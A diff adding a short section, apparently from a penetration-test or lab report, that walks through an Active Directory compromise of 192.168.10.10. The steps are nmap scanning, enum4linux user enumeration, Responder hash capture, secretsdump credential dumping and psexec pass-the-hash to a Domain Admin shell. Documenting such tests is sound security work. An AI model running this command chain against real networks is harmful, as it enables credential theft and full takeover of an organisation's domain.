@@ -1,0 +1,86 @@
+# Technical Execution
+
+## Network Scan
+
+Command:
+
+nmap -sC -sV 192.168.10.10
+
+Result:
+
+Discovered:
+
+- SMB
+- LDAP
+- Kerberos
+
+Conclusion:
+
+Domain Controller identified.
+
+---
+
+## User Enumeration
+
+Command:
+
+enum4linux -a 192.168.10.10
+
+Result:
+
+Discovered users:
+
+employee1
+admin1
+
+Conclusion:
+
+Valid usernames identified.
+
+---
+
+## Credential Harvesting
+
+Command:
+
+responder -I eth0
+
+Result:
+
+Captured NTLM hash.
+
+Conclusion:
+
+Credentials compromised.
+
+---
+
+## Credential Dumping
+
+Command:
+
+secretsdump.py corp.local/user:password@192.168.10.10
+
+Result:
+
+Administrator hash extracted.
+
+Conclusion:
+
+Privilege escalation possible.
+
+---
+
+## Privilege Escalation
+
+Command:
+
+psexec.py corp.local/Administrator@192.168.10.10 -hashes HASH
+
+Result:
+
+Domain Admin shell obtained.
+
+Conclusion:
+
+Full domain compromise achieved.
